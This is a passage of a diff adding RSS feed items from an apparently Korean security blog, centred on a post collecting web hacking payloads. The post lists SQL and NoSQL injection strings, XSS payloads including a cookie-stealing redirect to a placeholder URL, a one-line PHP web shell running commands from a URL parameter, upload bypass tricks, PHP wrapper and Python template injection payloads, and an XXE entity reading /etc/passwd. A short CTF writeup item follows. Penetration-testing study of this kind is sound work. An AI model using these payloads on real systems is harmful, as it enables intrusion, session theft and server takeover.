+      <category domain="https://blog.jhyeon.dev/tags/il2cppdumper/">il2cppdumper</category>
+      
+      
+      <comments>https://blog.jhyeon.dev/2021/04/25/il2cppdumper-210425/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>Web/Hacking Payload Docx</title>
+      <link>https://blog.jhyeon.dev/2021/04/21/webpayload-210421/</link>
+      <guid>https://blog.jhyeon.dev/2021/04/21/webpayload-210421/</guid>
+      <pubDate>Tue, 20 Apr 2021 15:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h2&gt;&lt;p&gt;해당 자료는 웹 해킹에 종류별 페이로드 문서를 정리하는 목적으로 작성된 게시글입니다.&lt;/p&gt;
+&lt;p&gt;자료는</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>해당 자료는 웹 해킹에 종류별 페이로드 문서를 정리하는 목적으로 작성된 게시글입니다.</p><p>자료는 계속해서 업데이트가 되는 자료이며, 최신순을 기준으로 상단에 기록됩니다.</p><p>페이로드는 보안상 문제로 일부 변환되어 표시되며 다음 사이트에서 복호화가 가능합니다.</p><ul><li><a href="http://parkjuwan.dothome.co.kr/webapp/ltgt_conv/">http://parkjuwan.dothome.co.kr/webapp/ltgt_conv/</a></li></ul><h3 id="SQL-Injection-Basic"><a href="#SQL-Injection-Basic" class="headerlink" title="SQL Injection(Basic)"></a>SQL Injection(Basic)</h3><pre><code>&#39; or &#39;1&#39; = &#39;1&#39; or 1=1#&#39; or 1=1--or 1=1or true--or 1=1/*1′) and &#39;1′=&#39;1–admin&#39; --&#39; order by 2#&#39; union select 1,2,3,version()#&#39; union select 1,2,3,table_name from information.schema.tables#&#39; union select 1,2,3,table_name from information.schema.tables where table_name=&#39;tb_name&#39;#select count(*) from information_schema.tables where tables_schema=database();select length(table_name) from information_schema.tables where tables_schema=database() limit 0,1;select length(column_name) from table_name;select ascii(substring(table_name, 1, 1)) from informatio.schema.tables where table_schema=database(), limit 0, 1;</code></pre><h3 id="SQL-Injection-NoSQL"><a href="#SQL-Injection-NoSQL" class="headerlink" title="SQL Injection(NoSQL)"></a>SQL Injection(NoSQL)</h3><pre><code class="sql">param1[$ne]=1234&amp;param2[$ne]=0000</code></pre><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><pre><code class="html">&lt;!-- basic --&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;&amp;lt;img src=javascript:alert(1)&amp;gt;&amp;lt;img src=&quot;javascript:alert(1)&quot;&amp;gt;&amp;lt;img src=javascript:alert(String.FromCharCode(88,83,83))&amp;gt;&amp;lt;img src=x onmouseover=&quot;alert(1)&quot;&amp;gt;&amp;lt;img src=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;&amp;gt;&amp;lt;svg onload=alert(1)&amp;gt;&amp;lt;body onload=alert(1)&amp;gt;&lt;!-- HTML CHAR --&gt;&amp;#x3c;script&amp;#x3e;alert(1)&amp;#x3c;/script&amp;#x3e;&lt;!-- UNICODE Encoding --&gt;%u003cscript%u003ealert(1)%u003c/script%u003e&lt;!-- redirect --&gt;&amp;lt;script&amp;gt;location.href=&#39;url&#39;;&amp;lt;/script&amp;gt;&amp;lt;img src=x onerror=&quot;this.src=&#39;url&#39;&quot;;/&amp;gt;&amp;lt;iframe src=&quot;data/html, urlencode_text&quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;!-- session hijacking --&gt;&amp;lt;script&amp;gt;location.href=&#39;url/&#39;+document.cookie;&amp;lt;/script&amp;gt;</code></pre><h3 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h3><pre><code class="php">&lt;?phpsystem($_GET[&#39;cmd&#39;]);?&gt;</code></pre><h3 id="WebShell-Bypass-Trick"><a href="#WebShell-Bypass-Trick" class="headerlink" title="WebShell(Bypass Trick)"></a>WebShell(Bypass Trick)</h3><ul><li><p>filename extension (php.jpg , php.png …)</p></li><li><p>gif89a, jpg, png (Insert to Image File Header)</p></li></ul><h3 id="PHP-Wrapper-Injection"><a href="#PHP-Wrapper-Injection" class="headerlink" title="PHP Wrapper Injection"></a>PHP Wrapper Injection</h3><pre><code>expect://lsphp://filter/convert.base64-encode/resource=filename</code></pre><h3 id="SSTI-Python"><a href="#SSTI-Python" class="headerlink" title="SSTI(Python)"></a>SSTI(Python)</h3><pre><code>&#123;&#123;7*7&#125;&#125;&#123;&#123;config.items()&#125;&#125;&#123;&#123; [].class.base.subclasses() &#125;&#125;&#123;&#123;''.class.mro()[1].subclasses()&#125;&#125;&#123;&#123; ''.__class__.__mro__[2].__subclasses__() &#125;&#125;</code></pre><h3 id="SSTI-Bypass-Trick"><a href="#SSTI-Bypass-Trick" class="headerlink" title="SSTI(Bypass Trick)"></a>SSTI(Bypass Trick)</h3><p><img src="/img/post/webpayload/filters.png" class="lazyload" data-srcset="/img/post/webpayload/filters.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="photo1"></p><ul><li>ascii encode(<a href="http://defindit.com/ascii.html">http://defindit.com/ascii.html</a>)</li></ul><h3 id="XML-Injection"><a href="#XML-Injection" class="headerlink" title="XML Injection"></a>XML Injection</h3><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE cmd [                                     &lt;!ENTITY passwd SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;                                                 &lt;cmd&gt;&amp;passwd;&lt;/cmd&gt;</code></pre><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">https://owasp.org/www-community/xss-filter-evasion-cheatsheet</a></li><li><a href="https://github.com/payloadbox/ssti-payloads">https://github.com/payloadbox/ssti-payloads</a></li><li><a href="https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f">https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f</a></li><li><a href="https://github.com/omurugur/SQL_Injection_Payload/">https://github.com/omurugur/SQL_Injection_Payload/</a></li></ul>]]></content:encoded>
+      
+      
+      <category domain="https://blog.jhyeon.dev/categories/Web/">Web</category>
+      
+      
+      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Penetration/">Penetration</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/OWASP/">OWASP</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/WebHacking/">WebHacking</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/webhacking-kr/">webhacking.kr</category>
+      
+      
+      <comments>https://blog.jhyeon.dev/2021/04/21/webpayload-210421/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>HackPackCTF 2021 Writeup</title>
+      <link>https://blog.jhyeon.dev/2021/04/18/hackpackctf-210418/</link>
+      <guid>https://blog.jhyeon.dev/2021/04/18/hackpackctf-210418/</guid>
+      <pubDate>Sat, 17 Apr 2021 15:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;p&gt;HACKPACK CTF 2021 (4/17 Sat 01:00 ~ 4/18 Mon 01:00 KST)&lt;/p</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>HACKPACK CTF 2021 (4/17 Sat 01:00 ~ 4/18 Mon 01:00 KST)</p><ul><li><a href="https://ctf2021.hackpack.club/team">https://ctf2021.hackpack.club/team</a></li><li>pwnhub (jhyeon, owl, 3kk, MalHyuk)</li><li>rank : 81th (400pt)</li></ul><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p>해당 게시글은 아래 노션 링크를 통해 확인하실 수 있습니다.</p><ul><li><a href="https://public.jhyeon.dev/ctf/hackpack2021">https://public.jhyeon.dev/ctf/hackpack2021</a></li></ul>]]></content:encoded>
+      
+      
+      <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
+      
+      
+      <category domain="https://blog.jhyeon.dev/tags/CTF/">CTF</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/CTFtime/">CTFtime</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Pwn/">Pwn</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Rev/">Rev</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Crypto/">Crypto</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/HackPackCTF-2021/">HackPackCTF 2021</category>
+      
+      
+      <comments>https://blog.jhyeon.dev/2021/04/18/hackpackctf-210418/#disqus_thread</comments>
+      
+    </item>
+    
+  </channel>
+</rss>
